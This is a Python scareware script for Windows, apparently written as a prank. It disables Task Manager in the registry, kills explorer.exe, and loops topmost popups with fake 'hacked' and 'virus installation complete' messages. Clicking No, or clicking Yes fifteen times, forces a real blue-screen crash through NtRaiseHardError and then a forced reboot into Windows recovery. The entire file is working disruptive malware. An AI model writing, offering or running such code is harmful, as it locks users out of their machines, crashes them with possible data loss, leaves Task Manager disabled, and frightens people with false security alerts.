import ctypes
import random
import time
import os
import winreg

yes_count = 0
bsod_triggered = False

# Constants
MB_YESNO = 0x04
MB_ICONWARNING = 0x30
MB_TOPMOST = 0x00040000

# "Hacked" messages for popups
messages = [
    "You've been hacked!",
    "Still trying to escape?",
    "Yes won't help you.",
    "System breach detected.",
    "Unauthorized access.",
    "Too many attempts.",
    "You're locked in.",
    "Try something else.",
    "Just click No... if you dare.",
    "Do you trust this system?",
    "Error: Human input detected.",
    "Virus installation complete.",
    "Monitoring activated.",
    "Self-destruction imminent.",
    "Security lockdown initiated."
]

def disable_task_manager():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def prepare_advanced_startup():
    try:
        os.system("reagentc /boottore")
    except:
        pass

def trigger_real_bsod_then_advanced_boot():
    try:
        prepare_advanced_startup()
        privilege_enabled = ctypes.c_bool()
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(privilege_enabled))

        response = ctypes.c_uint()
        ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022, 0, 0, 0, 6, ctypes.byref(response)
        )

        os.system("shutdown /r /o /f /t 0")
    except Exception as e:
        print("Error triggering BSOD:", e)

def show_popup_loop():
    global yes_count, bsod_triggered

    while True:
        msg = random.choice(messages)
        result = ctypes.windll.user32.MessageBoxW(
            0, msg, "Security Alert", MB_YESNO | MB_ICONWARNING | MB_TOPMOST)

        if result == 6:  # Yes clicked
            yes_count += 1
            if yes_count >= 15 and not bsod_triggered:
                bsod_triggered = True
                time.sleep(1)
                trigger_real_bsod_then_advanced_boot()

        elif result == 7:  # No clicked
            trigger_real_bsod_then_advanced_boot()

if __name__ == "__main__":
    disable_task_manager()
    os.system("taskkill /f /im explorer.exe")  # <- Kill taskbar, desktop
    show_popup_loop()
